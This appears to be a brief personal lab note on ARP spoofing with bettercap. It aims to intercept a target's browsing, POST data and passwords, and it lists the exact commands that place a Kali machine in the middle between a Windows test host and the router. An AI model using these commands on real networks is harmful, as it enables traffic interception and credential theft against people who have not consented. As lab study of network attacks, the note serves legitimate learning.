Arpspoofing using bettercap
-: we can see all the URLS and all the website they visit
-: we can see post, password or anything that happens

Inside bettercap tool
We write
help arp.spoof

arp.spoof.fullduplex - both the router and target will be spoofed if you set it true

Type this in bettercap tool

set arp.spoof.fullduplex true. ( if there is no error then its working)
If you want to target more than one ip you can use comma

set arp.spoof.targets 10.0.2.7 ( target is my windows machine)
arp.spoof on. ( if it gives no error then its fine)

Now if you press help
help

You will see arp.spoof is on
net.profe and net.recon should be on

So this commands will bring my kali machine to middle

Now if you go in windows machine
Press arp -a
